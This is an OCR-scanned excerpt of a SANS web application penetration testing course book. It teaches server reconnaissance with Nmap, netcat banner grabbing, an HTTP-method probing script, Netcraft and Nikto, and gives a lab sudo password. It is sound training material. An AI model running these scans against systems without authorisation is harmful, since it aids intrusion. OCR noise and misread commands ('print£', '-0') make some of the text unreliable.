Countermeasures & Cyber Deception 
Mobile Device Security 
& Ethical Hacking 
Wireless Penetration Testing 
and Ethical Hacking 
Social Engineering 
for Penetration Testers 
Automating Information 
Security with Python 
This slide shows the SANS Penetration Testing Curriculum, offering a variety of courses all focused on helping 
organizations improve their security through the use of penetration testing, vulnerability analysis, and Red 
Teaming. 
2 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.__., 
'-....,I 
__, 
'-....,I 
'-...,/ 
\.J 
'-" 
'-....,/ 
'-..., 
'-' 
'-' 
'-' 
'-' 
'-...,/ 
'-' 
'-...,I 
'-' 
'-....,/ 
,_.., 
'-" 
'-....,/ 
\.J 
\.J 
\.__.,
'-....,/
'-....,/
'-" 
'-J 
'-J 
'-....,/ 
'-J 
'-....,/ 
'-J 
'-' 
'-....,/ 
'-" 
'-"
'-"
'-J 
Table of Contents 
Scanning with Nmap 
. 
EXERCISE: Gathering Server Information 
. 
Testing Software Configuration 
. 
Shellshock 
. 
EXERCISE: Shells hock 
. 
Spidering Web Applications 
. 
EXERCISE: Web Spidering 
. 
Analyzing Spidering Results 
. 
EXERCISE: ZAP Forced Browse 
. 
Fuzzing 
. 
Information Leakage 
. 
EXERCISE: Directory Browsing 
. 
- 
5 
16 
18 
26 
37 
39 
54 
56 
62 
64 
69 
77 
SEC5421 Web App Penetration Testing and 
542.2 Table of Contents 
This table of contents outlines our plan for 542.2. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
3 
'-" 
'--1 
'--1 
Table of Contents 
Ill 
Authentication 
. 
EXERCISE: Authentication 
. 
Username Harvesting 
. 
EXERCISE: Username Harvesting 
. 
Burp Intruder 
. 
EXERCISE: Fuzzing with Burp Intruder 
. 
Summary 
. 
79 
93 
95 
105 
107 
113 
115 
SEC542 I Web App Penetration Testing and Ethical Hacking 
4 
'-" 
'-" 
'-" 
'--" 
'-" 
\..._; 
'-" 
'---' 
'---' 
'--" 
'---' 
'---' 
'--" 
'--" 
'-" 
'-" 
542.2 Table of Contents 
'-" 
'-" 
Here is the rest of the Table of Contents for 542.2. 
'---' 
'---' 
'-" 
'--" 
'-" 
'-" 
'---' 
'-" 
'-" 
'-" 
'-../ 
'-" 
'-J 
.'-J 
'-" 
'-" 
'-" 
'--" 
'---' 
4 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'---' 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exorcise: Gathering Server Information 
l. Testing Software Configuration 
-4. Shellshock 
5. Exercise: ShellsHoclc 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analy:ring Spidering Results 
9. Exercise: ZAP Forced Browse 
IO. Fuzzing 
I I. Information Leakage 
12. Exercise: Directory BroW'lling 
13. Authentication 
14. Exercise: Authentication 
15. Username Harvesting 
16. Exercise: Username Harvesting 
17. Bui:p Intruder 
I tt Exercise: Fuzzing with Burp Intruder 
Course Roadmap 
Welcome to Security 542, Web App Penetration Testing and Ethical Hacking: Day 2! 
We will discuss testing web configuration, identity, and authorization. 
,.....__ 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
5 
Nmap 
_Port .. Scara_ner 
• The most popular port scanner is Nmap by Fyodor 
• Actively scans a target and reports open ports 
• Can detect the OS and service versions 
o -0 option invokes OS fingerprinting 
o-sV option invokes service version detection 
• Nmap is currently using its second-generation OS fingerprinting 
• Better chance of accurate detection than its first-gen capabilities 
o Written as a Summer of Code project 
Nmap is an extremely popular port scanner. It is typically used to enumerate the open ports on systems, and can 
also identify the operating system and listening services with a fairly high degree of accuracy. This can allow an 
attacker to tailor exploits and attacks to the target system (while being very useful for network administrators 
and security professionals as well). 
For an attacker, one of the biggest problems with Nmap is that it is easily detected. Nmap operates by sending a 
packet to each port on the target host (the port range is configurable). Based on the received responses, Nmap 
determines whether the port is "open," "closed," or "filtered" by a firewall. The timing and method ofNmap's 
scans can be configured to lower the likelihood of detection. Slow scans are generally less likely to be noticed 
because they create less network traffic in a given period of time. TCP SYN scans are stealthier than TCP 
connect scans because TCP SYN scans send only a SYN packet and never complete a TCP connection. 
Intrusion Detection Systems (IDS) detect these types of scans by default, but because port scans are so common, 
most people just ignore such alerts. 
In addition to post-scanning capabilities, Nmap is also able to perform operating system and service version 
detection through the "-0" and "-sV" options, respectively. 
Nmap is actively maintained and available at https://nmap.org/ (https://cyber.gd/542 _ 246) QR 
6 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
\.....; 
'---' 
. .._, 
'-" 
'-" 
'---' 
'---' 
'-J 
'-J 
'-" 
'-J 
'-" 
'-J 
'-J 
'-J 
6 
'-J 
'---' 
'-J 
\...., 
\...., 
. ....__, 
'-" 
'-" 
'-J 
'-J 
'-.../ 
\...,, 
'-.../ 
\...,, 
'-.../ 
'-" 
\...,, 
'-J 
\...,, 
\...,, 
'-.../ 
'-.../ 
'-J 
'-" 
\...,, 
Nmap Example 
- + :,: 
scanme.nmap.org 
Starting Nmap 7.40 ( https://nmap.org) at 2017-02-14 08:26 PST 
N11ap scan report for scanme.nmap.org (45.33.32.156) 
Host is up (0.48s latency). 
Other addresses for scanme.nmap.org (not scanned}: 2680:3cBl::fB3c:9lff:fel8:bb2f 
Not shown: 996 closed ports 
PORT 
STATE SERVICE 
VERSION 
22/tcp 
open 
ssh 
OpenSSH 6.6.lpl Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) 
~8/tcp 
open 
http 
Apache httpd 2.4.7 ((Ubuntu)) 
9929/tcp open 
nping-echo Nping echo 
.31337/tcp open tcpwrapped 
Service Info: 05: Linux; CPE: cpe:/o:linux:linux_kernel 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
N111ap done: l IP address (1 host up) scanned in 13.04 seconds 
J-u 1 
------ 
·········· 
-···------- ----- .. ----··. -----------····-·····' 
This slide demonstrates the use ofNmap to identify the application service version information of 
scanme.nmap.org, which is a site that allows public scanning: 
We set up this machine to help folks learn about Nmap and also to test and make sure that their Nmap 
installation (or internet connection) is working properly. You are authorized to scan this machine with 
Nmap or other port scanners. Try not to hammer on the server too hard. A few scans in a day is fine, 
but don't scan I 00 times a day or use this site to test your ssh brute-force password cracking tool. 
1 
Reference: 
[ 1] http://scanme.nmap.org (https://cyber.gd/542 _ 228) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
7 
V 
'--.,I 
Zenrnap 
• Zenmap is the graphical frontend to Nmap 
• You may run it by typing (the sudo password is "Securityg.qz"): 
$ sudo zerunap 
Zenmap is a graphical frontend to Nmap and is quite handy. 
Here's a free CTF hint: Use zenmap to scan the CTF network during 542.6. It provides the same information as 
Nmap, but is especially useful when juggling lots of data. 
You may run zenmap by typing (the sudo password is "Security542"): 
$ sudo zenmap 
Note that sudo means "super user do"; it provides a way for non-root users to run commands as root. The user 
must have appropriate permissions set up in the /etc/sudoers file, which we have done for the student account. 
8 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--.,I 
'--.,I 
'-..../ 
'--.,I 
'--.,I 
"-..., 
'-..../ 
'--.,I 
'--.,I 
'--.,I 
'-../ 
'-..../ 
'-../ 
'--.,I 
8 
'-..../ 
'--.,I 
'--.,I 
'--.,I 
'-' 
'--.,I 
'-..../ 
'--.,I 
'-..../ 
'-..../ 
'-..../ 
'--.,I 
'--.,I 
'-..../ 
'--.,I 
'-' 
'-..../ 
'-..../ 
'-'
'----' 
'-..../ 
'-..../ 
'--.,I 
'--.,I 
'-../ 
Server Profiling 
Profiling the server's configuration is the next step 
• Some of the same tools can be used 
Identifying the server software and versions can help guide our 
attacks 
• Based on known vulnerabilities or configuration issues 
Now, we move to the next step: Profiling the server. This is a deeper test than just detecting the OS, examining 
the configuration, and identification of supporting infrastructure devices. 
Every server is different, not only in what software is running, but also with respect to the surrounding network 
topology and relationships with other systems. For each server, you will want to identify the software-serving 
HTTP, including plugins and extra features, any SSL support provided (remember, SSL is a wrapper for TCP 
protocols), the type of virtual server hosting the website (IP-based or name-based virtual host), and whether the 
site is hosted behind a load balancer. 
Identifying server software provides a great deal of information about the attack surface and the techniques that 
will be required. If the server is Apache on FreeBSD with PHP4 installed, the attack profile will significantly 
differ from an !IS.NET box with FrontPage Extensions. 
Versions of SSL and supported ciphers impact various forms of attack, from man-in-the-middle attacks to 
service-level vulnerabilities. 
Understanding the type of virtual hosting used by the site is vital for knowing how to interact with the site and 
crafting your attack. If name-based virtual hosting is employed by the site and your attack does not include the 
appropriate Host: header, the attack will not work. SSL-support will also be limited on name-based virtual hosts 
because SSL is set up by IP address. Other sites of interest might live on the same IP address, and information 
about the host and network may be obtained by poking at the Host: header or pulling the default page for the IP 
address. 
Load balancers introduce complexity for attackers. Most often, the important thing to understand is how the site 
implements persistence. Some load balancers tie a session to a particular server. Multi-connection attacks are 
simpler for this type of persistence, whereas other approaches are required for other load-balancing schemes. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
9 
'.-I 
'.-I 
Web servers are a main target of the test 
• But not the only target; don't forget about database servers, client systems, 
etc. 
The server type and version significantly affect the test 
• Might be vulnerable to attack 
• Different server types can impact the attack methods we'll choose 
There are multiple ways to gather server version information 
• A thorough tester should use multiple means to determine the server type 
and version for increased accuracy 
IIS 
Internet 
lnformetion Servket 
"Ill 
AF"-""CHE 
'.-I 
'-J 
'-J 
'-J 
'-../ 
'-J 
'----' 
'-J 
'-../ 
'-----' 
'----' 
'----' 
'-../ 
As web servers are a main target during a test, determining the version and type becomes very important. The 
type of web server will affect the test because they might be vulnerable to attack themselves. They also change 
how we approach things such as injection flaws and other web attacks. This is because the attacks use the 
application to attack the underlying server or operating system. 
Because this is important for a test, we try to run multiple tests to verify the results. As part of a thorough 
penetration test, an analyst should leverage multiple techniques to determine the server for increased accuracy 
because this will significantly influence the remainder of the test. 
10 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'.-I 
'.-I 
'.-I 
'-../ 
'-../ 
'-../ 
'-..,I 
'-..,I 
'-./ 
'-..,I 
'-./ 
'-../ 
'.-I 
'.-I 
'-..,I 
'----' 
'-J 
'.-I 
'-J 
'-./ 
'-..,I 
'-./ 
\J 
'-J 
N map can perform version detection of the services found 
with the -sV option 
• Without a port designation, Nmap will scan a set of default ports 
,,--,. --------i-----i---t-fl-t---1-t-.onnects to each open port and looks for a banner 
,,--,. 
• If none is presented, Nmap sends "nudge" packets 
N map matches responses to signatures in an application 
database 
• nmap-service-probes contains the probes and responses expected 
New fingerprint contributions welcome! 
Nmap is wonderful for revealing a wealth of information about target hosts, including banner information, 
which often reveals detailed information about each service. Using the "-sV" argument, Nmap will perform a 
service-version scan on the target host (using the "-A" argument causes Nmap to perform both service-version 
scanning and OS identification). 
Note the output from scanme.nmap.org (also shown previously) identifies the web server version as Apache 
httpd 2.4.7, and both ssh and http services mention "Ubuntu". 
Starting Nmap 7.40 ( https://nmap,org ) at 2017-02-14 08:26 PST 
Nmap scan report for scanme.nmap.org (45.33.32,156) 
Host is up (0,48s latency). 
Other addresses for scanme,nmap.org {not scanned): 2600:3c01::f03c:91ff:fel8:bb2f 
Not shown: 996 closed ports 
PORT 
STATE SERVICE 
VERSION 
22/tcp 
open 
ssh 
OpenSSH 6.6.lpl Ubuntu 2ubuntu2.B (Ubuntu Linux; protocol 2,9) 
80/tcp 
open http 
Apache httpd 2.4.7 ((Ubuntu)) 
9929/tcp open nping-echo Nping echo 
31337/tcp open tcpwrapped 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
Service detection performed. Please report any incorrect results at ht tps : //nmap. 
: 
1 IP address (1 host up) scanned in 13.04 seconds 
Because the application/OS fingerprinting database is only as good as the signatures behind it, please submit 
new fingerprints to the Nmap developers when the opportunity arises. Nmap will tell you when it has 
encountered a new service, providing the signature details and a description of how to submit the data to 
improve the reliability of the service version detection feature. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
11 
Us.ing Netcatto ... Grab .Server•·connectionStrings 
• N etcat: Swiss Army knife of network connections 
• Testers can use it to connect to a web server, retrieve 
pages, and inspect server response data 
• Header data might reveal the server's version 
• However, information that comes back might be a lie 
o An administrator might have configured the system to provide a 
bogus server string 
$ print£ "GET/ HTTP/1.0\r\n\r\n" 
I 
nc -v scanme.nmap.org 80 
'--,I 
'--' 
'--' 
'---' 
'--' 
'--' 
'--' 
'--' 
'---' 
'-../ 
'--' 
'--' 
'--' 
'--' 
'--' 
'---' 
'--' 
One of the simplest but most powerful tools is Netcat. It is the network Swiss Army knife, partly due to the fact 
that it can connect to any network service and allow the attacker to try to communicate with the service. 
For a web app pen tester, Netcat can be used to connect to a web server and manually enter HTTP verbs and 
associated data to retrieve pages or otherwise manipulate the server into revealing useful information. Although 
not typically visible to a web browser, web server responses including "X-Powered-By" and "Server" are very 
useful to the web app pen tester. 
Although the server banner information is often accurate, it could be falsified by an administrator to mislead an 
attacker (for example, the website could be configured to return "Microsoft-IIS/6.0" when it is actually an 
Apache server). As such, server response information should be considered suspect and evaluated for further 
confirmation. 
12 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
\_.,, 
'--' 
'--' 
'--' 
'--' 
'-..../ 
'-../ 
'-../ 
'---' 
'--' 
'--' 
'--' 
Netcat ServerVersion 
$ print£ "GET / HTTP/1.0\r\n\r\n" 
I nc -v scanme.nmap.org 80 
Connection to scanme.nmap.org 80 port [tcp/http] 
succeeded! 
HTTP/1.1 200 OK 
Date: Sat, 03 Feb 2017 21:33:43 GMT 
Server: Apache/2.4.7 (Ubuntu) 
True! 
$ print£ "GET/ HTTP/1.0\r\n\r\n" 
I nc -v files.ericconrad.com 80 
Connection to files.ericconrad.com 80 port [tcp/http] 
succeeded! 
HTTP/1.1 200 OK 
Date: Sat, 03 Feb 2018 21:37:25 GMT 
Server: Atari/2600 ---------------------------~ 
Not True! 
This client example is one way to connect to a web server and retrieve a fingerprint of the server. This example 
redirects the printfto Netcat, which connects to the server on port 80. The server then responds because the 
printf statement is a request for the main page of the site. As seen in the example on this slide, this technique can 
reveal useful version information from the web server. 
The second example uses the Apache mod_security module to change the server "Prod" string to "Atari/2600". 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
13 
'-_,I 
'-_,I 
Netcraft • Detection 
Web server analysis site, reporting server 
use statistics for public sites 
• Also generates anti-phishing data web server 
version based on returned banner 
• Can be falsified by your target 
Public search interface 
• Reports history of web server service, version 
• Only useful for publicly accessible websites 
Active versioning technique 
Hosting History 
l\letbloci< owner 
IP address 
SANS INSTITUTE 8120 Woodmont Avenue Suite 205 Bethesda MD US 20814 65.35.59.249 
Linux 
SANS INSTITUTE 8120 Woodmont Avenue Suite 205 Bethesda MD US 20814 66.35.59.249 
Linux 
SANS lNST!T\JTE 8120 Woodmont Avenue Suite <05 Bethesda MD US 20814 66.35.59.249 
Linux ~~ - 
nc ·5 ·I 
18·Dec· 
80 
2016 
nc ·I 8 
30·Apr· 
2014 
Apache 
25·Sep· 
2013 
'-_,I 
'-_,I 
'-../ 
'-../ 
'-../ 
'-...J 
-...J 
-...J 
'-../ 
-...J 
Netcraft is an Internet services company providing analysis findings for the utilization of various web servers on 
the Internet as well as information on phishing attack sites. By collecting information through active polling 
techniques and through the Netcraft Toolbar, Netcraft has collected several years' worth of data about the 
distribution of web server and version information on a large percentage of the Internet. For some sites, Netcraft 
can identify the dates when a site upgraded from one web server version to another. 
Although querying a web server with Netcraft does not directly interact with the target website, it does reveal 
the target and your IP address to Netcraft. Before using Netcraft, it is important to evaluate the terms of your 
pen-test scope and other contractual obligations to ensure this is not a contract violation. 
Reference: 
[I] http://www.netcraft.com (https://cyber.gd/542 ~ 25) QR 
14 
© 2018, Seth Misenar, Eric.Conrad, and Kevin Johnson 
-...J 
-...J 
-...J 
-...J 
'-../ 
'-' 
-...J 
'-_,I 
'-' 
'-' 
-...J 
'--' 
-...J 
'-../ 
'-' 
-...J 
'-' 
'-' 
'-' 
'-./ 
'-../ 
'--' 
.._,, 
.._,, 
'-' 
'-../ 
'-" 
'--' 
''-../ 
Netcraft Example 
A ravesctcr library use-d to simplify th-e 
dient~1hfo scripting ,;;-f HTML 
PHP:9- 
Strict 
TtfiilS[}Ort 
secnfity :r? 
Vieb serndty ooncv n1ei:hadsrn 
uhitr(by 
web server cte.-.:tares that 
co.moiyif1:9 user agents are to :internet 
with it t;sing cn!v secure HifP 
connections 
Doctvpe 
11TML5@ 
XHl 
SSL@ 
A cryotogr:aphk prorcccl providing 
communication securttv over the 
Internet 
X-Fr-¢ffH,,.- 
Do not aeow 
Options Same 
·wil'J1in an lframe 
Origin 
x-xss- 
Protection 
Block& 
Block peces on 
-s<Tipti:10 is drtr:,ctc--<l 
latest revision of the HTML 
standard, the maln markeu l,;1n-gaage 
on the web 
Client-Side 
Technology 
Op:~r: source proqrsammirg 
part cf 4 web browser 
This slide illustrates an example of using Netcraft2 to identify the web server and OS of a website. Additional 
information about the target is also available, including the netblock owner (often revealing the hosting 
provider's ISP information) and domain registrant information. The site report portion ofNetcraft provides an 
easy way to quickly look at Netcraft's data on the site in question. 
References: 
[I] http://toolbar.netcraft.com/site _report (https://cyber.gd/542 _ 26) QR 
[2] http:/ /www.netcraft.com (https://cyber.gd/542 _ 25) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
15 
'-..,I 
\...,, 
Course Roadmap 
CONFIGURATION,IDENl"ll"Y, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
3. Testing Software Configuration 
4. Shellshodc 
5. Ex.ercise: Shelfshod< 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyzing Spidering Results 
9, Exerc.ise: ZAP Forced Browse 
IO.. Fuzzing 
I I. Information 1.ea1<age 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
I 5. Username Harvesting 
16. Exercise: Usemame Harvesting 
17. Burp Intruder 
18, Exercise: 
Summary 
SEC542 
Penetration Testing and Ethical Hacking 
with Burp Irrtruder 
16 
'-..,I 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-'
'-' 
'-..,I 
'-../ 
'-' 
'-../ 
'-../ 
'-'
Course Roadmap 
'-" 
'-' 
Our next exercise will use both Netcat and Nmap to gather server information. 
16 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'--..I 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-' 
'-' 
'-" 
'-.../ 
'-' 
'-" 
'-" 
'-.../ 
'---' 
'-..,I 
'-' 
'-' 
'- 
SEC542 Workboolc Gathering Server Information 
II 
Exercise 2.1: Gathering Server 
Information 
SEC542 Workbook: Gathering Server Information 
Please go to Exercise 2.1 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
17 
'-' 
'---'
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
l. Scanning with Nmap 
2. Exercisee Gathering Server Information 
3. Testing Software Configuration 
4. Shellshock 
5. Exercise: Shellshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP Forced 
!O. Fuzzing 
I ! . Information Leakage 
12. Exercise: Directory Browsing 
I 3. Authentication 
14. Exercise; Authentication 
IS. Username Harvesting 
16. Exercise: IIJsername Harvesting 
17. Burp Intruder 
18. Exercise: Fuzzing with Burp Intruder 
19, Summary 
SECS42 I Web App PenetrationTesting and Ethical Hicking 
I$ 
'---' 
'-'
'-' 
'-.J 
'-' 
.'-.../ 
'---' 
'---' 
'-' 
'-' 
'---' 
'---' 
'-' 
'-' 
'-' 
'-' 
Course Roadmap 
'---' 
'---' 
Next up: Testing software configuration. 
'-' 
'-' 
'---' 
'---' 
'-' 
'-' 
'-.../ 
'---' 
'---' 
'-' 
'-' 
'---' 
'-../ 
'-' 
'-' 
'-' 
'-../ 
'---' 
'--' 
18 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'-' 
OTG-INFO-002: Fingerprint Web Server 
"Web server fingerprinting is a critical task for the 
penetration tester. Knowing the version and type 
ofa running web server allows testers to 
determine known vulnerabilities and the 
appropriate exploits to use during testing.'' 1 
OTG-INFO-002 
An outdated or unpatched web server can undermine an otherwise secure web application. OTG-INFO-002 
identifies the need for fingerprinting web servers. 
Reference: 
[l] https://www.owasp.org/index.php/Fingerprint_ Web_ Server _(OTG-INFO-002) (https://cyber.gd/542 _ 247) 
QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
19 
OTG .. CONFIG--006:Test HTTP.Methods 
"HTTP offers a number of methods that can be 
used to perform actions on the web server. Many 
of these methods are designed to aid developers in 
deploying and testing HTTP applications. These 
HTTP methods can be used for nefarious purposes 
if the web server is misconfigured." 1 
\..../ 
'-.J 
'-.J 
'-../ 
'-../ 
'-../ 
'----" 
\..../ 
.-..J 
'----" 
'-.J 
'----" 
-..J 
OTG-CONFIG-006 
Test ID OTG-CONFIG-006 has the tester assess the HTTP Methods/Verbs supported by the web server. 
Reference: 
[ 1) https://www.owasp.org/index.php/Test_ HTTP_ Methods _(OTG-CONFIG-006) (https://cyber.gd/542 _ 248) 
QR 
20 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'-../ 
'-../ 
'----" 
'----" 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'----" 
-..J 
'----" 
'-../ 
'-../ 
'----" 
'-.J 
\..../ 
'--" 
'-../ 
\_I
v 
'-../ 
Software Configuration 
Understanding the configuration is an important step: 
• Configuration of the underlying server machine (OS, network services, and 
such) 
• Configuration of the web server daemon 
What features are available? 
• Is PHP supported on the target? 
• Which HTTP request methods are accepted? 
Are there any default pages? 
• Examples or documentation 
After the network layout is determined and other low-impact reconnaissance has been conducted, it's time to 
determine what we're dealing with at a software level. Thus far, we have been scoping the playground, and now 
we are about to check out the sandbox. Knowing what software and configurations exist in our target 
environment can help us determine how best to form the sand to build our empire ( one sandcastle at a time). 
Two of the ways to determine the configuration are to check the supported HTTP methods and look for default 
pages. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
21 
I._; 
\...-1 
SupportedHTTP RequestMethods 
• Determine the HTTP request methods supported by the target infrastructure 
• Look for interesting ones: 
o PUT: WebDAV method that enables files to be PUT onto the server 
o DELETE: Allows for removing files 
o CONNECT: Tunnel within the HTTP protocol 
o TRACE: Echo the request as seen by the server 
o OPTIONS: List supported methods 
• There are many different ways to check which methods are supported by the 
server 
• Most of the tools we use list supported HTIP methods as part of their output 
or report 
'-' 
'-' 
'-' 
'-' 
'-' 
'-../ 
'-' 
'-.J 
'-' 
'-' 
'-../ 
'----' 
'----' 
Most likely, every web server will support the GET method of HTTP. However, the following methods can be 
more interesting: 
PUT: Used by WEBDA V to write files to the web server 
DELETE: Used by WEB DAV to delete files from the web server 
CONNECT: Creates a TCP Tunnel through the server/proxy 
TRACE: Shows the request as the server received it, including modifications made by intermediary servers 
OPTIONS: Displays the supported methods 
As part of the pen test, we need to identify all available request methods. Fortunately, several tools are 
available that can help us with this task. 
22 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-../ 
'-J 
'-J 
'-' 
'-' 
'-' 
'-' 
'-../ 
'-../ 
'-' 
'-../ 
'-' 
'-' 
'-' 
'-' 
'----' 
'-.J 
'-' 
'-../ 
I.._.; 
'-' 
I.._.; 
'----' 
I.._.; 
Using Netcat to Determine Supported HTTP Request Methods 
• N etcat is perfect for testing available HTTP request methods 
• Manually type HTTP commands into Netcat or script the requests 
• A bash script can iterate through request method types, invoking 
Netcat for each: 
#!/bin/bash 
for method in GET POST PUT TRACE CONNECT OPTIONS; 
do 
printf "$method/ HTTP/1.1\r\nHost: 
www.sec542.org\r\n\r\n" 
I 
nc www.sec542.org 80 
done 
As discussed earlier, Netcat is simple but powerful. Because it enables the attacker to issue commands either 
directly to the server or through scripts, mapping out supported methods becomes simple: Query the server for 
each potential method, as shown in the shell script on this slide. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
23 
'-" 
Default• Pages 
• A common issue is default pages left 
on a target server 
• These pages can identify the server 
software and lead to vulnerabilities 
o Example files and applications are often 
part of the default install 
• Documentation is commonly left on 
servers 
• Try accessing via IP address instead 
ofhostname 
o This bypasses name-based virtual 
hosting 
• Many of the tools discussed in class 
discover default pages on targets 
o Nik.to is a great tool for finding default 
content, especially associated with 
security issues 
@ 
Apache2 Debian Default Page~ api1 
debian 
:~- 
- 
--:itwollcs l 
This is the aptl werccme page csec to test the correct operation of the Apache2 server after rnstenenon 
on oetsen sysl:Crn\.. If you -can read this p~ge, it means th.Jt the Ap.iche KTif> serv er lO$~Ue:::l at this sue 
ss w<>i'king i)ropedy. You should replace th.1$ flle (locate:! at lva.t/w-w/<tpil/index.htmJ) before 
,contiru,1ln9 to ocerete your HTTP server. 
tr yoti are a normal user of this web site <1M don't koo-w what this p-agc ls abol.lt, this probably means 
that tM stte !¼ cu.rtcflt!y cnevaueete due to rnarntenance. lf the p:rublcm persists, please cMtact the 
sae's aommtstrator. 
11 S 
'-../ 
'-../ 
'-J 
'-../ 
'-../ 
\_., 
'-J 
'-J 
\_.,' 
'-../ 
'-../ 
The other thing to look for is default pages. These are files installed when the server was built. Examples of this 
are the welcome page from Apache or some of the sample scripts installed on IIS. 
One technique for checking for default pages is to access the server via its IP address. Many servers are 
configured to serve up different pages based on the fully qualified hostname the client is requesting, but server 
administrators sometimes forget to configure a custom site for the IP address, revealing default web pages. 
24 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-....,' 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-J 
'-.._,/ 
'-../ 
'-../
'-.../ 
'-../
'--. 
'-../ 
'-J
'-J
'-J
'-J
'-' 
'-J 
'-../
'-../
'-J
'-J 
'-.../
'-../ 
\._,,
'-../
Nikto 
• Nikto is a Perl program written by Chris Sullo (http://www.cirt.net) 
• It uses a "database" of items to scan for on the server 
• Various files containing: 
o Widely used server-side scripts and 
programs known to be vulnerable response 
strings from various servers 
o MD5 hashes of favicons of specific servers 
o Discovers default files residing on the 
server 
o May have false positives due to the way 
servers and applications handle missing 
pages 
~rt1alJ.t+ 
•Cgidirt.-+ 
<-9:i/ Jc{ll-•r 
,dbch.,.ck 
•Ol'Jp\ay+ 
-1h••1.1on-t 
-P:or••t.,. 
lto,t+ 
-Htllp 
·id+ 
H~:r•al• 
-\i~t-ph19in• 
·!!Ut•te:+ 
-eutere-eparons e 
-outpct e 
-nccact,c 
·M$1>1 
·!<0484 
•P,Otl~ 
Use 01i.1 ~ontia f ate 
seen thu• or d:ir'l!I; 'none'. ·all', or vetoes like 
caece oerebese and other 11:.(ty f.Hes for syotaJt: error's 
Turn on/off di1-1tl.!1>; outpt1t, 
ids 1?vMiof1 t,t.;;:ti,n.i.quit 
save file { ·o! toreer 
target host 
£.xte:ndec<I help infl'l-n:rntion 
nest eument tcat tcn to use, format is id:p;v,s: or 
Li s.t au •v•ihiol« plugtn, 
<iua-s.i-; &ddit.laHl 1th n .. e,15 
Pl"ovid• n:tu 111,tort'lati-o" for 11;ut.it1oos 
Write g,1.1tjlwt to etu e fib 
Oi:;:Ablu O,e ORI O(JJe 
msebtee ~l'HPl9 S-5l 
Dit.-•l•f. .fe-4 Clll•clo;il 
f"ort tu use IOtte•\t eel 
Nikto is a great tool for automatically looking for vulnerable web applications. It contains a database of 
vulnerable applications and attempts to access each of them in tum. In the newest version, it even compares the 
favicon.ico file on the server to known icons to fingerprint the application. 
The name Nikto is from the movie The Day the Earth Stood Still, where the alien says "Klaatu barada nikto." 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
25 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
3. Testing Software Configuration 
4. Shellshock 
S. Exercise: Shellshock 
6. Spidering Web Applications 
1. Exercise: Web Spidering 
3. Analyzing Spidering Results 
tu,:,r,r,,,.,,~ ZAP Forced Browse 
L!. Information Leakage 
12 •. Exercise: Directory Browsing 
! 3. Authentication 
14. Exercise: Authentication 
I S. Username Harvesting 
'"' Exercise: Username Harvesting 
17. Burp Intruder 
18. Exercise: Fuzzing with Burp Intruder 
J9. Summary 
SEC542 I Web App PenetrationTesting and Ethical Hacking 
26 
'-.../ 
'-" 
'-.../ 
'-" 
'---' 
'-- 
'-' 
'-.../ 
'-.../ 
'-...,/ 
'-.../ 
